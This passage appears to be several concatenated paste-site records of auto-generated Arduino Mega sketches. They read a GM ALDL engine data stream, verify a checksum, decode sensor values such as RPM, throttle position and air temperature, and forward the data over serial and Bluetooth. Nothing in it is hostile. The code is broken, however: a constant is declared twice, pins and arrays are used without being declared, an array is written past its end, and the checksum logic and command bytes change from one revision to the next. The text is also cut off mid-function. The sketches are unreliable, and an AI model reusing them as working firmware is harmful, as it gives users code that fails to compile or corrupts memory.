/****** END SYSTEM REQUIREMENTS *****/

/* START CODE */

/****** DEFINITION OF LIBRARIES *****/

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);
float T_interpolate(byte DS_Temp); // Prototype for the interpolation function

// Define pins
const int ALDLTestPin = 4;
const int DecodeDataOutputPin = 2; // Example pin, adjust as needed
const int HexDataOutputPin = 3;    // Example pin, adjust as needed

// Define command array and other variables
byte M1Cmd[4] = {0x80, 0x95, 0x01, 0x00}; // Example command, adjust as needed
const int ByteCount = 64;
byte DataBytes[65];
int DataStreamIndex = 0;
unsigned long PreambleTimer = 0;
bool PreambleFound = false;
bool SilenceFound = false;
unsigned long StartTime = 0;
int i = 0;
float RPM, TPS, MAF, BLCELL, BLM, INTEGRATOR, InjPW, O2mv, MAT, Runtime;
const int linecount = 32;
int bytecounter = 0;
const byte Preamble[3] = {0x80, 0x95, 0x01};
const int linecount = 32;
unsigned int CheckTotal = 0;
byte ALDLbyte = 0;
float CheckSum = 0;

// Bluetooth serial port
// Adjust the serial port as per your hardware connection
// For example, Serial2 for Mega
// Initialize in setup()

void setup() 
{
  // **** I/O configuration and setup first
  pinMode(ALDLTestPin, INPUT);                                              // define D4 as an input pin to listen for the 160 baud input data
  pinMode(DecodeDataOutputPin, INPUT_PULLUP);                                // User convenience pin.  Grounding this pin will send Decoded Data to the Serial Port
  pinMode(HexDataOutputPin, INPUT_PULLUP);                                   // User convenience pin.  Grounding this pin will send HEX Data to the Serial Port

  // Initialize serial ports
  Serial.begin(115200);                                                     // Open serial monitoring port
  Serial1.begin(8192);                                                      // Test the capability of esp 8222 to run at 8192 baud directly
  Serial2.begin(9600); // Initialize Bluetooth serial port at 9600 baud (adjust as needed)

  delay(1500);                                                              // delay for diagnostic print
  Serial.println(""Ready for data capture"");

  // Initialize variables
  i=0;                                                                      // Reset the preamble index flag
}

void loop() {
  // Send data from Bluetooth to Android
  if (Serial2.available() > 0) {
    int btData = Serial2.read();
    Serial.print(""Bluetooth data: "");
    Serial.println(btData, HEX);
  }

  // Wait for silence period on the ALDL
  Serial.print(""wait for silence "");
  SilenceFound = false;                                                     // Reset silence flag
  StartTime= micros();                                                      // First look for an active signal or a timeout - initialize timer
  while ((micros() - StartTime)< 15000) {                                     // Wait for a 15 ms silent period 
    if (digitalRead(ALDLTestPin)== 0) {                                         // Any line activity resets the start time
      StartTime= micros();                                                   // Timing starts over
    }
  }                                                             
  SilenceFound = true;                                                      // Set the silence flag on exit

  while (SilenceFound == true) {                                              // While silence found flag is set, continuously request and transmit Mode 1 data 
    PreambleFound = false;                                                    // Reset preamble found flag                                                             
    while (PreambleFound == false) {                                           // First look at data until the preamble has been found will read data forever until a preamble is read
      Serial.print("" M1 cmd "");
      i=0;                                                                  // use bytecounter to send the outgoing Mode1CMD sequence
      while (i<4) {
        Serial1.write(M1Cmd[i]);                                            // sends 1 byte of the command sequence
        i++;
      }  
      Serial.println("" Finding Preamble  "");  
      i=0;                                                                  // Then reset byte counter and scan incoming data for the preamble
      PreambleTimer = millis();                                             // Initialize timer to detect timeout
      while ((((millis() - PreambleTimer) < 100)) && (PreambleFound == false)) { // First look at data for 100 ms or until the preamble has been found
        if (Serial1.available() > 0) {                                      // Check for available data on the serial port
          ALDLbyte = Serial1.read();                                      // Read it and look for the preamble
          if ( ALDLbyte == Preamble[i]) {                                   // Look for matching byte of data preamble in serial stream 
            i++;                                                        // Increment the preamble index and look for the next character
            if (i>2) PreambleFound = true;                               // Once three characters are found, the preamble has been found, time to read in the data
          } else {                                                            // If there isn't match, start over looking from the beginning
            PreambleFound = false;                                      // Reset preamble found flag
            i=0;                                                        // Reset the preamble index flag          
          } // end if
        } // end if
      } // end while
    } // end while

    // Read complete data packet
    DataStreamIndex = 1;                                                  // Once a valid preamble has been found set the data stream index to the first byte
    while (DataStreamIndex < 65) {                                          // and read data up to byte #63 + 1 byte Checksum = 64 Bytes total
      if (Serial1.available() > 0) {                                    // Check for available data on the serial port
        DataBytes[DataStreamIndex] = Serial1.read();                // And read bytes into the array as they come
        DataStreamIndex++;                                          // update the index
      } // end if
    } // end while

    // Checksum calculation
    i=1;                                                                  // use bytecounter as an index
    CheckTotal = 0x80+0x95+0x01;                                          // sum preamble bytes
    while (i< (ByteCount )) {                                               // Add received bytes to the checksum
      CheckTotal = CheckTotal + DataBytes[i];                           // add a byte
      i++;
    }   
    CheckSum = 0x200 - CheckTotal;                                        // Two's complement the checksum

    // Send data to serial port based on output mode
    if (digitalRead(DecodeDataOutputPin) == LOW) {                          // Check decoded output bit
      Serial.print(""New Data Stream received at "");
      Serial.print(millis());
      Serial.print("" Calc CHECKSUM: "");
      Serial.print(CheckSum, HEX);
      Serial.print("" Transmitted CHECKSUM: "");
      Serial.print(DataBytes[ByteCount], HEX);
      if (CheckSum == DataBytes[ByteCount]) {
        Serial.println("" Checksum GOOD - Decoded Data as follows:   (Page 1) ""); 
      } else {
        Serial.println("" Checksum *** ERROR *** -  Decoded Data as follows:   (Page 1) "");                  
      }
      // ... (rest of data processing and printing code)
    } else if (digitalRead(HexDataOutputPin) == LOW) {                        // Hex output mode
      Serial.print(""New Data Stream received at "");
      Serial.print(millis());
      Serial.print("" Calc CHECKSUM: "");
      Serial.print(CheckSum, HEX);
      Serial.print("" Transmitted CHECKSUM: "");
      Serial.print(DataBytes[ByteCount], HEX);
      if (CheckSum == DataBytes[ByteCount]) {
        Serial.println("" Checksum GOOD - Data as follows: "");      
      } else {
        Serial.println(""Checksum *** ERROR *** -  Data as follows: "");
      }
      int j=1;
      bytecounter = 0;
      while (j<ByteCount +1) {
        Serial.print(DataBytes[j], HEX);
        j++;
        bytecounter++;
        if (bytecounter >= linecount) {
          bytecounter = 0;
          Serial.println("""");
        } else {
          Serial.print("" "");
        }
      }
      Serial.println("""");
    } else { // Raw binary stream
      Serial.write(0x80);
      Serial.write(0x95);
      Serial.write(0x01);
      for (int j=1; j<ByteCount +1; j++) {
        Serial.write(DataBytes[j]);
      }
    }

    // Send data over Bluetooth to Android
    for (int j=1; j<ByteCount +1; j++) {
      Serial2.write(DataBytes[j]);
    }
  } // end while (SilenceFound)

  // Additional code for processing and other functions...
}

// Implementation of the interpolation function
float T_interpolate(byte DS_Temp) {
  const float TempScale[38] = {1,5,6,9,11,15,19,25,31,38,47,57,67,79,91,104,117,130,142,154,164,175,184,192,200,206,212,217,222,226,230,233,235,238,240,242,244,256};
  const float TempValue[38] = {-40,-30,-25,-20,-15,-10,-5,0,5,10,15,20,25,30,35,40,45,50,55,60,65,70,75,80,85,90,95,100,105,110,115,120,125,130,135,140,145,200};
  float T_Range, T_Diff, TempRange, Temperature;
  int i=0;
  while (i<38) {
    if (TempScale[i]> DS_Temp) break;
    i++;
  }
  if (i>0) {
    T_Range = TempScale[i] - TempScale[i-1];
    T_Diff = DS_Temp - TempScale[i-1];
    TempRange = TempValue[i] - TempValue[i-1];
    Temperature = TempValue[i-1] + (T_Diff/T_Range)*TempRange;
  } else {
    Temperature = TempValue[0];
  }
  return Temperature;
}
"
v91EmJDv,Vehicle Diagnostics rev_08,pleasedontcode,Arduino,Friday 11th of July 2025 04:25:16 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: Vehicle Diagnostics
	- Source Code NOT compiled for: Arduino Mega
	- Source Code created on: 2025-07-11 21:24:37

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* send data from bluetooth to tunerpro */
/****** END SYSTEM REQUIREMENTS *****/

/* START CODE */

/****** DEFINITION OF LIBRARIES *****/

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);
float T_interpolate(byte DS_Temp); // Prototype for the interpolation function

void setup() 
{
  // **** I/O configuration and setup first
  pinMode(ALDLTestPin, INPUT);                                              // define D4 as an input pin to listen for the 160 baud input data
  pinMode(DecodeDataOutputPin, INPUT_PULLUP);                                // User convenience pin.  Grounding this pin will send Decoded Data to the Serial Port
  pinMode(HexDataOutputPin, INPUT_PULLUP);                                   // User convenience pin.  Grounding this pin will send HEX Data to the Serial Port
  // **** Now, start the serial functions
  Serial.begin(115200);                                                     // Open serial monitoring port
  Serial1.begin(8192);                                                      // Test the capability of esp 8222 to run at 8192 baud directly
  delay(1500);                                                              // delay for diagnostic print
  Serial.println(""Ready for data capture"");
  // Initialize variables if needed
  int i=0;                                                                    // Reset the preamble index flag
}

void loop() {
  // Forward Bluetooth data from Serial to Serial1 (TunerPro)
  while (Serial.available() > 0) {
    int incomingByte = Serial.read();
    Serial1.write(incomingByte);
  }

  // Wait for silence period on the ALDL
  Serial.print(""wait for silence "");
  bool SilenceFound = false;                                                    // Reset silence flag
  unsigned long StartTime= micros();                                              // First look for an active signal or a timeout - initialize timer
  while ((micros() - StartTime) < 15000) {                                         // Wait for a 15 ms silent period
    if (digitalRead(ALDLTestPin) == 0) {                                             // Any line activity resets the start time
      StartTime= micros();                                                         // Timing starts over
    }
  }
  SilenceFound = true;                                                              // Set the silence flag on exit

  while (SilenceFound == true) {                                                      // While silence found flag is set, continuously request and transmit Mode 1 data
    bool PreambleFound = false;                                                         // Reset preamble found flag
    while (PreambleFound == false) {                                                      // First look at data until the preamble has been found
      Serial.print("" M1 cmd "");
      byte M1Cmd[4] = {0x80, 0x56, 0x01, 0x29}; // Mode 1 command to start 8192 Mode 1 DataStream
      for (int i=0; i<4; i++) {
        Serial1.write(M1Cmd[i]); // Send command bytes
      }
      Serial.println("" Finding Preamble  "");
      int i=0; // Preamble index
      unsigned long PreambleTimer = millis(); // Initialize timer
      while ((((millis() - PreambleTimer) < 100)) && (PreambleFound == false)) {
        if (Serial1.available() > 0) {
          int ALDLbyte = Serial1.read();
          if (ALDLbyte == Preamble[i]) {
            i++;
            if (i > 2) PreambleFound = true; // Preamble found
          } else {
            PreambleFound = false;
            i=0;
          }
        }
      }
    }
    // Read data stream after preamble
    const int ByteCount = 64;
    byte DataBytes[ByteCount+1]; // 1-based indexing for clarity
    int DataStreamIndex = 1;
    while (DataStreamIndex <= ByteCount) {
      if (Serial1.available() > 0) {
        DataBytes[DataStreamIndex] = Serial1.read();
        DataStreamIndex++;
      }
    }
    // Calculate checksum
    int i=1;
    unsigned long CheckTotal = 0x80 + 0x95 + 0x01; // sum preamble bytes
    while (i <= ByteCount) {
      CheckTotal += DataBytes[i];
      i++;
    }
    byte CheckSum = (byte)(0x200 - CheckTotal); // Two's complement
    // Verify checksum and output data
    if (digitalRead(DecodeDataOutputPin) == LOW) {
      Serial.print(""New Data Stream received at "");
      Serial.print(millis());
      Serial.print("" Calc CHECKSUM: "");
      Serial.print(CheckSum, HEX);
      Serial.print("" Transmitted CHECKSUM: "");
      Serial.print(DataBytes[ByteCount], HEX);
      if (CheckSum == DataBytes[ByteCount]) {
        Serial.println("" Checksum GOOD - Decoded Data as follows:   (Page 1) "");
      } else {
        Serial.println("" Checksum *** ERROR *** -  Decoded Data as follows:   (Page 1) "");
      }
      // Decode data
      float RPM = DataBytes[11] * 25; // Engine RPM
      float TPS = DataBytes[10] * 0.019608; // TPS volts
      float MAF = ((DataBytes[36] * 256) + DataBytes[37]) * 0.003906; // MAF gm/sec
      int BLCELL = DataBytes[21];
      int BLM = DataBytes[20];
      int INTEGRATOR = DataBytes[22];
      float InjPW = ((DataBytes[45] * 256) + DataBytes[46]) * 0.015259; // ms
      float O2mv = DataBytes[17] * 4.44; // mV
      float MAT = T_interpolate(DataBytes[30]);
      unsigned int Runtime = (DataBytes[52] * 256) + DataBytes[53];

      // Print decoded data
      Serial.print(""Engine Speed     : "");
      Serial.print(RPM);
      Serial.println("" RPM"");
      Serial.print(""Throttle Position: "");
      Serial.print(TPS);
      Serial.println("" Volts"");
      Serial.print(""Mass Air Flow    : "");
      Serial.print(MAF);
      Serial.println("" Grams/Sec"");
      Serial.print(""Current BLM Cell: "");
      Serial.print(BLCELL);
      Serial.print("" BLM Value: "");
      Serial.print(BLM);
      Serial.print(""  Current Fuel Integrator: "");
      Serial.println(INTEGRATOR);
      Serial.print(""Injector Pulse   : "");
      Serial.print(InjPW);
      Serial.println("" Milliseconds"");
      Serial.print(""O2 Sensor Voltage: "");
      Serial.print(O2mv);
      Serial.println("" Millivolts"");
      Serial.print(""Intake Air Temp  : "");
      Serial.print(MAT);
      Serial.println("" Deg C"");
      Serial.print(""Engine Run Time  : "");
      Serial.print(Runtime);
      Serial.println("" Seconds"");
      // Delay for user to read
      unsigned long StartTime = millis();
      while (millis() < StartTime + 3000) {
        if (Serial1.available() > 0) ALDLbyte = Serial1.read(); // flush buffer
      }
    } else if (digitalRead(HexDataOutputPin) == LOW) {
      // Hex output mode
      Serial.print(""New Data Stream received at "");
      Serial.print(millis());
      Serial.print("" Calc CHECKSUM: "");
      Serial.print(CheckSum, HEX);
      Serial.print("" Transmitted CHECKSUM: "");
      Serial.print(DataBytes[ByteCount], HEX);
      if (CheckSum == DataBytes[ByteCount]) {
        Serial.println("" Checksum GOOD - Data as follows: "");
      } else {
        Serial.println(""Checksum *** ERROR *** -  Data as follows: "");
      }
      // Print hex data
      int j=1;
      int bytecounter=0;
      while (j<=ByteCount) {
        Serial.print(DataBytes[j], HEX);
        Serial.print("" "");
        j++;
        bytecounter++;
        if (bytecounter >= linecount) {
          bytecounter=0;
          Serial.println();
        }
      }
      Serial.println();
    } else {
      // Raw binary data
      Serial.write(0x80);
      Serial.write(0x95);
      Serial.write(0x01);
      for (int j=1; j<=ByteCount; j++) {
        Serial.write(DataBytes[j]);
      }
    }
  }
}

// Implementation of the interpolation function
float T_interpolate(byte DS_Temp) {
  const float TempScale[38] = {1,5,6,9,11,15,19,25,31,38,47,57,67,79,91,104,117,130,142,154,164,175,184,192,200,206,212,217,222,226,230,233,235,238,240,242,244,256};
  const float TempValue[38] = {-40,-30,-25,-20,-15,-10,-5,0,5,10,15,20,25,30,35,40,45,50,55,60,65,70,75,80,85,90,95,100,105,110,115,120,125,130,135,140,145,200};
  float T_Range, T_Diff, TempRange, Temperature;
  int i=0;
  while (i<38) {
    if (TempScale[i]> DS_Temp) break;
    i++;
  }
  if (i>0) {
    T_Range = TempScale[i] - TempScale[i-1];
    T_Diff = DS_Temp - TempScale[i-1];
    TempRange = TempValue[i] - TempValue[i-1];
    Temperature = TempValue[i-1] + (T_Diff/T_Range)*TempRange;
  } else {
    Temperature = TempValue[0];
  }
  return Temperature;
}
"
wsmWv7aP,Vehicle Data rev_06,pleasedontcode,Arduino,Friday 11th of July 2025 04:12:31 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: Vehicle Data
	- Source Code NOT compiled for: Arduino Mega
	- Source Code created on: 2025-07-11 21:11:46

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* send data from bluetooth to aldldroid */
/****** END SYSTEM REQUIREMENTS *****/

/* START CODE */

/****** DEFINITION OF LIBRARIES *****/
// No additional libraries needed for Bluetooth serial communication

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);
float T_interpolate(byte DS_Temp);

/****** Bluetooth Serial Object ******/
HardwareSerial BluetoothSerial(2); // Using Serial2 for Bluetooth communication

void setup() 
{
  // **** I/O configuration and setup first
  pinMode(ALDLTestPin, INPUT);                                              // define D4 as an input pin to listen for the 160 baud input data
  pinMode(DecodeDataOutputPin, INPUT_PULLUP);                                // User convenience pin.  Grounding this pin will send Decoded Data to the Serial Port
  pinMode(HexDataOutputPin, INPUT_PULLUP);                                   // User convenience pin.  Grounding this pin will send HEX Data to the Serial Port

  // Initialize serial communications
  Serial.begin(115200);                                                     // Open serial monitoring port
  Serial1.begin(8192);                                                      // Initialize Serial1 at 8192 baud for ALDL data
  BluetoothSerial.begin(9600);                                                // Initialize Bluetooth serial at 9600 baud
  delay(1500);                                                              // delay for diagnostic print
  Serial.println(""Ready for data capture"");
  BluetoothSerial.println(""Arduino Mega Bluetooth Data Stream Ready"");
  
  // **** Initialize the variables, flags, etc
  int i=0;                                                                  // Reset the preamble index flag
}

void loop() {
  // Wait for silence period on the ALDL
  Serial.print(""wait for silence "");
  bool SilenceFound = false;                                                     // Reset silence flag
  unsigned long StartTime= micros();                                              // First look for an active signal or a timeout - initialize timer
  while ((micros() - StartTime) < 15000) {                                     // Wait for a 15 ms silent period 
    if (digitalRead(ALDLTestPin) == 0) {                                       // Any line activity resets the start time
       StartTime= micros();                                                   // Timing starts over
     }
  }                                                             
  SilenceFound = true;                                                      // Set the silence flag on exit

  while (SilenceFound == true) {                                              // While silence found flag is set, continuously request and transmit Mode 1 data 
    bool PreambleFound = false;                                                 // Reset preamble found flag                                                             
    while (PreambleFound == false) {                                         // First look at data until the preamble has been found will read data forever until a preamble is read
      Serial.print("" M1 cmd "");
      int i=0;                                                                  // use bytecounter to send the outgoing Mode1CMD sequence
      byte M1Cmd[4] = {0x80,0x56,0x01,0x29};                                    // Mode 1 command to start 8192 Mode 1 DataStream (80 56 01 29 HEX)
      while (i<4) {
        Serial1.write(M1Cmd[i]);                                            // sends 1 byte of the command sequence
        i++;
      }  
      Serial.println("" Finding Preamble  "");  
      i=0;                                                                  // Then reset byte counter and scan incoming data for the preamble
      unsigned long PreambleTimer = millis();                                             // Initialize timer to detect timeout
      while ((((millis() - PreambleTimer) < 100)) && (PreambleFound == false)) {                    // First look at data for 100 ms or until the preamble has been found will read data forever until a preamble is read
        if (Serial1.available() > 0) {                                      // Check for available data on the serial port
          int ALDLbyte = Serial1.read();                                      // Read it and look for the preamble
          if (ALDLbyte == Preamble[i]) {                                   // Look for matching byte of data preamble in serial stream 
            i++;                                                        // Increment the preamble index and look for the next character
            if (i>2) PreambleFound = true;                               // Once three characters are found, the preamble has been found, time to read in the data
          }        
          else {                                                            // If there isn't match, start over looking from the beginning
            PreambleFound = false;                                      // Reset preamble found flag
            i=0;                                                        // Reset the preamble index flag          
          }                                                             // End of Preamble check
        }                                                               // End of Serial Available & read
      }                                                                  // End of the preamble finding routine either preamble found or timeout          
    }
    // Read complete data packet
    int DataStreamIndex = 1;                                                  // Once a valid preamble has been found set the data stream index to the first byte
    byte DataBytes[64];                                                // Array to hold the serial data stream
    while (DataStreamIndex < 65) {                                          // and read data up to byte #63 + 1 byte Checksum = 64 Bytes total
      if (Serial1.available() > 0) {                                    // Check for available data on the serial port
        DataBytes[DataStreamIndex] = Serial1.read();                // And read bytes into the array as they come
        DataStreamIndex++;                                          // update the index
      }                                                             // end of read if
    }                                                                   // End of datastream read while

    // Checksum calculation
    int i=1;                                                                  // use bytecounter as an index
    unsigned int CheckTotal = 0x80+0x95+0x01;                                          // Sum of preamble bytes
    while (i< (64)) {                                               // Add received bytes to the Checksum
      CheckTotal = CheckTotal + DataBytes[i];                           // add a byte
      i++;
    }   
    byte CheckSum = 0x200 - CheckTotal;                                        // Two's complement the checksum
    // Verify checksum
    if (digitalRead(DecodeDataOutputPin) == LOW) {                          // Check decoded output bit
      Serial.print(""New Data Stream received at "");
      Serial.print(millis());
      Serial.print("" Calc CHECKSUM: "");
      Serial.print(CheckSum, HEX);
      Serial.print("" Transmitted CHECKSUM: "");
      Serial.print(DataBytes[63], HEX);                          // Last byte (64th) transmitted is ECM's checksum
      if (CheckSum == DataBytes[63]) {                             // Checksums match
        Serial.println("" Checksum GOOD - Decoded Data as follows:   (Page 1) ""); 
        // Send data over Bluetooth
        BluetoothSerial.print(""RPM:"");
        float RPM = DataBytes[11] * 25;                                    // Engine RPM
        BluetoothSerial.print(RPM);
        BluetoothSerial.print("",TPS:"");
        float TPS = DataBytes[10] * 0.019608;                               // TPS volts
        BluetoothSerial.print(TPS);
        BluetoothSerial.print("",MAF:"");
        float MAF = ((DataBytes[36] * 256) + (DataBytes[37])) * 0.003906;   // Mass Air Flow
        BluetoothSerial.print(MAF);
        BluetoothSerial.print("",BLCELL:"");
        int BLCELL = DataBytes[21];
        BluetoothSerial.print(BLCELL);
        BluetoothSerial.print("",BLM:"");
        int BLM = DataBytes[20];
        BluetoothSerial.print(BLM);
        BluetoothSerial.print("",INTEGRATOR:"");
        int INTEGRATOR = DataBytes[22];
        BluetoothSerial.print(INTEGRATOR);
        BluetoothSerial.print("",InjPW:"");
        float InjPW = ((DataBytes[45] * 256) + (DataBytes[46])) * 0.015259;
        BluetoothSerial.print(InjPW);
        BluetoothSerial.print("",O2mv:"");
        float O2mv = DataBytes[17] * 4.44;
        BluetoothSerial.print(O2mv);
        BluetoothSerial.print("",MAT:"");
        float MAT = T_interpolate(DataBytes[30]);
        BluetoothSerial.print(MAT);
        BluetoothSerial.print("",Runtime:"");
        unsigned int Runtime = (DataBytes[52] * 256 + DataBytes[53]);
        BluetoothSerial.println(Runtime);
      }
      else { 
        Serial.println("" Checksum *** ERROR *** -  Decoded Data as follows:   (Page 1) "");                  
      }
    }
    else if (digitalRead(HexDataOutputPin) == LOW) {                        // Check hex output flag 
      Serial.print(""New Data Stream received at "");
      Serial.print(millis());
      Serial.print("" Calc CHECKSUM: "");
      Serial.print(CheckSum, HEX);
      Serial.print("" Transmitted CHECKSUM: "");
      Serial.print(DataBytes[63], HEX);                          //Last byte (64'th) transmitted is ECM's checksum
      if (CheckSum == DataBytes[63]) {                             // Verify Checksums match
        Serial.println("" Checksum GOOD - Data as follows: "");      
      }
      else Serial.println(""Checksum *** ERROR *** -  Data as follows: "");
      int j=1; // Local Byte Count for message output  
      int bytecounter = 0;                                                  // Used to create 32 byte lines of data
      const int linecount = 64;                                             // 32 bytes per line
      while (j<64 +1) {                                            // Printing loop from byte 1 to bytecount
        Serial.print(DataBytes[j], HEX);                              // print the aldl data byte as hex
        // Send over Bluetooth as well
        BluetoothSerial.print(DataBytes[j], HEX);
        j++;                                                          // Move on to the next byte
        bytecounter++;                                                // Increment byte counter 
        if (bytecounter >= linecount) {                                 // check if time for new line
          bytecounter = 0;                                          // Reset byte count for next line
          Serial.println("""");                                       // add a new line
          BluetoothSerial.println("""");
        }
        else {
          Serial.print("" "");                                        // add a space
          BluetoothSerial.print("" "");
        }
      }
      Serial.println("""");                                               // New Line At end of transmit
      BluetoothSerial.println("""");
    } // End of Hex Output Loop
    else {                                                                  // Default is to send the raw binary data stream to the Serial Port
      // Send Raw Bytewise Data Stream to Serial Port
      Serial.write(0x80);                                                // write the preamble bytes (80 95 01 HEX)
      Serial.write(0x95);                                                     
      Serial.write(0x01);                                                    
      for (int j=1; j<65; j++) {                                // Printing loop from data byte 1 to bytecount, including checksum
        Serial.write(DataBytes[j]);                                   // write the aldl data byte as a binary byte
        // Send over Bluetooth as well
        BluetoothSerial.write(DataBytes[j]);
      }
    } // End of Raw Data Stream transmission
  } // Loop back for next Mode 1 Dump
}

// Implementation of T_interpolate function
float T_interpolate(byte DS_Temp) {                                         // Subroutine to interpolate MAT temperature from data stream
  // Temperature scale for interpolating air temperature taken from the ADS file. There are 38 values in the table ranging from -40C for a value of 1 to 200 C for a value of 256
  const float TempScale[38] = {1,5,6,9,11,15,19,25,31,38,47,57,67,79,91,104,117,130,142,154,164,175,184,192,200,206,212,217,222,226,230,233,235,238,240,242,244,256};  // Data Values (38)
  const float TempValue[38] = {-40,-30,-25,-20,-15,-10,-5,0,5,10,15,20,25,30,35,40,45,50,55,60,65,70,75,80,85,90,95,100,105,110,115,120,125,130,135,140,145,200}; // Temp Values (38)
  float T_Range;                                                          // Interpolation range
  float T_Diff;                                                           // Difference between input value and the bottom of the interpolation range
  float TempRange;                                                        // Difference between points on the output value scale
  float Temperature;                                                      // Interpolated Temperature value
  int i=0;
  while (i<38) {                                                            // Loop through increasing values to find start of the interpolation
    if  (TempScale[i]> DS_Temp) break;                                  // Until a higher value is found - exit with i pointing to the higher value for interpolation
    i++;
  }
  if (i>0) {                                                                // Figure out the linear interpolation range and difference along the scale
    T_Range = TempScale[i] - TempScale[i-1];                            // Range between these points along the input scale (all calculated as a floating point)
    T_Diff =  DS_Temp - TempScale[i-1];                                 // Difference between data and the lower point
    TempRange = TempValue[i] - TempValue[i-1];                          // Difference between points along the output value scale  
    Temperature =  TempValue[i-1] + (T_Diff/T_Range)*TempRange;         // Interpolated Temperature
  }
  else Temperature = TempValue[0];                                        // unless the input data is <= to the bottom of the scale and the minimum value is used

  return Temperature;                                                     // Return the interpolated temperature
}
"
wze6s4tk,Vehicle Data rev_05,pleasedontcode,Arduino,Friday 11th of July 2025 04:07:38 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: Vehicle Data
	- Source Code NOT compiled for: Arduino Mega
	- Source Code created on: 2025-07-11 21:06:56

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* send data from bluetooth to android pc */
/****** END SYSTEM REQUIREMENTS *****/

/* START CODE */

/****** DEFINITION OF LIBRARIES *****/
// No additional libraries needed for basic serial communication

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);
float T_interpolate(byte DS_Temp);

void setup() 
{
  // **** I/O configuration and setup first
  pinMode(ALDLTestPin, INPUT);                                              // define ALDLTestPin as an input pin to listen for the 160 baud input data
  pinMode(DecodeDataOutputPin, INPUT_PULLUP);                                // User convenience pin.  Grounding this pin will send Decoded Data to the Serial Port
  pinMode(HexDataOutputPin, INPUT_PULLUP);                                   // User convenience pin.  Grounding this pin will send HEX Data to the Serial Port

  // **** Now, start the serial functions
  Serial.begin(115200);                                                     // Open serial monitoring port
  Serial1.begin(8192);                                                      // Initialize Serial1 at 8192 baud for ALDL data
  Serial2.begin(9600);                                                      // Initialize Serial2 at 9600 baud for Bluetooth communication
  delay(1500);                                                              // delay for diagnostic print
  Serial.println(""Ready for data capture"");
}

void loop() {
  // Wait for silence period on the ALDL
  Serial.print(""wait for silence "");
  bool SilenceFound = false;                                                    // Reset silence flag
  unsigned long StartTime= micros();                                              // First look for an active signal or a timeout - initialize timer
  while ((micros() - StartTime) < 15000) {                                       // Wait for a 15 ms silent period 
    if (digitalRead(ALDLTestPin) == 0) {                                         // Any line activity resets the start time
       StartTime= micros();                                                     // Timing starts over
    }
  }                                                                              // Exit after 15 ms of silence
  SilenceFound = true;                                                          // Set the silence flag on exit

  while (SilenceFound == true) {                                                 // While silence found flag is set, continuously request and transmit Mode 1 data 
    bool PreambleFound = false;                                                  // Reset preamble found flag                                                             
    while (PreambleFound == false) {                                              // First look at data until the preamble has been found will read data forever until a preamble is read
      Serial.print("" M1 cmd "");
      int i=0;                                                                      // use bytecounter to send the outgoing Mode1CMD sequence
      while (i<4) {
        Serial1.write(M1Cmd[i]);                                                    // sends 1 byte of the command sequence
        i++;
      }  
      Serial.println("" Finding Preamble  "");  
      i=0;                                                                      // Then reset byte counter and scan incoming data for the preamble
      unsigned long PreambleTimer = millis();                                   // Initialize timer to detect timeout
      while ((((millis() - PreambleTimer) < 100)) && (PreambleFound == false)) {  // First look at data for 100 ms or until the preamble has been found
        if (Serial1.available() > 0) {                                            // Check for available data on the serial port
          int ALDLbyte = Serial1.read();                                            // Read it and look for the preamble
          if (ALDLbyte == Preamble[i]) {                                              // Look for matching byte of data preamble in serial stream 
            i++;                                                                      // Increment the preamble index and look for the next character
            if (i > 2) PreambleFound = true;                                           // Once three characters are found, the preamble has been found, time to read in the data
          } else {                                                                    // If there isn't match, start over looking from the beginning
            PreambleFound = false;                                                    // Reset preamble found flag
            i=0;                                                                      // Reset the preamble index flag          
          } // End of Preamble check
        } // End of Serial Available & read
      } // End of the preamble finding routine either preamble found or timeout          
      // Read a complete data stream packet
      int DataStreamIndex = 1;                                                      // Once a valid preamble has been found set the data stream index to the first byte
      byte DataBytes[65];                                                           // Array to hold the serial data stream
      while (DataStreamIndex < 65) {                                                 // Read 64 bytes (including checksum)
        if (Serial1.available() > 0) {                                                // Check for available data on the serial port
          DataBytes[DataStreamIndex] = Serial1.read();                                // Read byte into array
          DataStreamIndex++;                                                          // update the index
        }
      }
      // Checksum calculation
      int i=1;                                                                      // use bytecounter as an index
      unsigned int CheckTotal = 0x80 + 0x95 + 0x01;                                   // sum of preamble bytes
      for (i=1; i<65; i++) {                                                          // Add received bytes to checksum
        CheckTotal += DataBytes[i];                                                   // add a byte
      }
      byte CheckSum = (byte)(0x200 - CheckTotal);                                       // Two's complement
      // Verify checksum and process data
      if (digitalRead(DecodeDataOutputPin) == LOW) {                                // Check decoded output bit
        Serial.print(""New Data Stream received at "");
        Serial.print(millis());
        Serial.print("" Calc CHECKSUM: "");
        Serial.print(CheckSum, HEX);
        Serial.print("" Transmitted CHECKSUM: "");
        Serial.print(DataBytes[64], HEX);                                             // Last byte is ECM checksum
        if (CheckSum == DataBytes[64]) {                                              // Checksum match
          Serial.println("" Checksum GOOD - Decoded Data as follows:   (Page 1) ""); 
        } else {
          Serial.println("" Checksum *** ERROR *** -  Decoded Data as follows:   (Page 1) "");                  
        }
        // Extract and display data
